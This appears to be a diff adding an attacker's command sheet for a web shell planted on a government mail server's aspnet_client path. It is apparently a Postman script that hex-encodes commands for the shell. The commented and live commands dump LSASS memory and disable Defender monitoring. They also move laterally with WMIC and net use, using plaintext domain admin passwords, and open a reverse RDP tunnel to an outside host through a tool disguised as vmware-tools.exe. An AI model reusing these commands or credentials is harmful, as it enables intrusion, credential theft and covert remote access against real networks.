@@ -1,0 +1,60 @@
+212.175.168.58
+==================
+https://eposta.mfa.gov.ct.tr/aspnet_client/system_web/aspnet_client.aspx
+
+
+
+
+function ToHex(str) {
+              var arr = [];
+              for (var i = 0; i < str.length; i++) {
+                     arr[i] = ("00" + str.charCodeAt(i).toString(16)).slice(-4);
+              }
+              return arr.join("");
+       }
+
+//cmd='powershell.exe -c rundll32.exe comsvcs.dll, MiniDump 564 c:\\windows\\temp\\test.log full 2>&1'
+ //cmd='powershell.exe -exec bypass -c Set-MpPreference -DisableRealtimeMonitoring $true 2>&1'
+
+// cmd = 'wmic /NODE:"10.20.101.17" /USER:"Admin1@MFA" /PASSWORD:"KazimAtes1977+-*/!!KazimAtes1977+-*/!!" Process Call Create "cmd.exe /c netstat -ano -p tcp >c:\\windows\\temp\\Crashpad\\log.txt 2>&1" 2>&1'
+// cmd = 'wmic /NODE:"10.20.105.25" /USER:"pfsenselondra@MFA" /PASSWORD:"1234qqqQQQ" Process Call Create "cmd.exe /c reset session 3 >c:\\windows\\temp\\log.txt 2>&1" 2>&1'
+// cmd = 'wmic /NODE:"10.20.101.17" /USER:"pfsenselondra@MFA" /PASSWORD:"1234qqqQQQ" Process Call Create "cmd.exe /c echo Y | c:\\windows\\temp\\vmware-tools.exe 103.57.251.153 -P 443 -C -R 0.0.0.0:40455:10.20.105.11:3389 -l ruby -pw ruby@123! 2>&1" 2>&1'
+// cmd='net use \\\\10.20.105.21\\C$ "KazimAtes1977+-*/!!KazimAtes1977+-*/!!" /user:Admin1@MFA 2>&1'
+cmd='net use \\\\10.20.101.17\\C$ "KazimAtes1977+-*/!!KazimAtes1977+-*/!!" /user:Admin1@MFA 2>&1'
+// cmd='net use /delete \\\\10.20.101.2\\C$ /y 2>&1'
+// cmd='del /f c:\\inetpub\\wwwroot\\aspnet_client\\fav.ico 2>&1'
+// cmd='type \\\\10.20.105.21\\C$\\windows\\temp\\Crashpad\\log.txt 2>&1'
+
+//10.20.106.60
+// cmd = 'wmic /NODE:"10.20.106.60" /USER:"Admin1@MFA" /PASSWORD:"KazimAtes1977+-*/!!KazimAtes1977+-*/!!" Process Call Create "cmd.exe /c qwinsta >\\\\10.20.101.43\\c$\\windows\\temp\\log.txt 2>&1" 2>&1'
+// cmd='dir \\\\10.20.106.60\\C$\\users 2>&1'
+//10.20.101.2 TMG Server
+// cmd = 'wmic /NODE:"10.20.101.2" /USER:"Admin1@MFA" /PASSWORD:"KazimAtes1977+-*/!!KazimAtes1977+-*/!!" Process Call Create "cmd.exe /c qwinsta >c:\\windows\\temp\\log.txt 2>&1" 2>&1'
+// cmd='dir "\\\\10.20.101.2\\c$\\users\\admin1\\desktop\\" 2>&1'
+// cmd='net use /delete \\\\10.20.101.17\\C$ /y 2>&1'
+
+//local
+// cmd = 'wmic /NODE:"10.20.105.11" /USER:"Admin1@MFA" /PASSWORD:"KazimAtes1977+-*/!!KazimAtes1977+-*/!!" Process Call Create "cmd.exe /c C:\\programdata\\microsoft\\diagnostic\\svchost.bat >C:\\programdata\\microsoft\\diagnostic\\log.txt 2>&1" 2>&1'
+// cmd = 'wmic /NODE:"10.20.105.11" /USER:"Admin1@MFA" /PASSWORD:"KazimAtes1977+-*/!!KazimAtes1977+-*/!!" Process Call Create "cmd.exe /c echo Y | c:\\programdata\\microsoft\\diagnostic\\vmware-tools.exe 103.57.251.153 -P 443 -C -R 0.0.0.0:40455:127.0.0.1:3389 -l ruby -pw ruby@123! 2>&1" 2>&1'
+// cmd='del /f c:\\windows\\temp\\vmware.ps1  2>&1'
+// cmd='net use \\\\10.20.105.11\\c$ KazimAtes1977+-*/!!KazimAtes1977+-*/!! /user:Admin1@MFA 2>&1'
+// cmd='dir \\\\10.20.105.11\\C$\\programdata\\microsoft\\diagnostic\\vmware-tools.exe 2>&1'
+// cmd='dir \\\\10.20.105.11\\F$\\G0199911 2>&1'
+// cmd='type \\\\10.20.105.11\\c$\\windows\\temp\\logs.txt 2>&1'
+
+//cmd ='wmic Process Call Create "cmd.exe /c c:\\windows\\temp\\vmware.bat >c:\\windows\\temp\\log.txt 2>&1" 2>&1'
+// cmd='wmic netuse username get /value 2>&1'
+cmd='ping MFA-PC -n 1 2>&1'
+cmd='sc query "Microsoft Exchange Services Log" 2>&1'
+// cmd='dir \\\\10.20.105.11\\C$\\windows\\temp 2>&1'
+//  cmd = "upload"
+ cmd = ToHex(cmd);
+ var path = '\\\\10.20.105.11\\C$\\programdata\\microsoft\\diagnostic\\vmware-tools.exe';
+ path = ToHex(path);
+ pm.environment.set("ruby",cmd);
+ pm.environment.set("path",path);
+
+
+
+=======================================================
+212.175.168.58
